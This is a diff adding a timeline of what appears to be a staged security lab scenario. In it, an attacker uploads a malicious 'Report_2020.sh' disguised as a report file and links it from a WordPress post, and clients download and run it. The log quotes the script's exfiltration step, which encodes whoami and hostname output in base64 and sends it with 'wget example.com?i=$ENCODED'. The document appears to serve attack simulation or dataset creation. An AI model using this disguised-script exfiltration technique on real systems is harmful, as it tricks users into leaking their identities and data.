@@ -1,0 +1,17 @@
+What happened:
+
+- Start 11:45 14/03/2020
+- login all users to their clients - access to Wordpress
+- (install some tools, filezilla on clients)
+- (sepses creates ftp_admin user on the server)
+- jdoe creates Report_2019 and Report_2020 files and logs in to the FTP server (with ftp_admin) and uploads the files
+- jdoe, jhalley, akep access the files via ftp and their accounts
+- sepses is on the server, created an evil script "Report_2020.sh"
+-- uploads the file on the FTP server next to the other report files
+-- edits a wordpress post and links the "Report_2020.sh" file
+- Client C3 and C2 open the wordpress post, click the download button and save the sh file on the clients
+-- then they execute the file (had to set permissions locally to exectue it)
+-- the script calls whoami and reads the current hostname (ip) [the script could steal much more information - pwd files for example], encodes it in base64 and calls the website "wget example.com?i=$ENCODED"
+- Client C1 downloads the script file via FTP and execudes it as well
+- sepses goes to the server and opens the example wodpress apache log > there he can find the ENCODED calls from the clients and knows the usersnames and their IPs
+- Stop 17:22
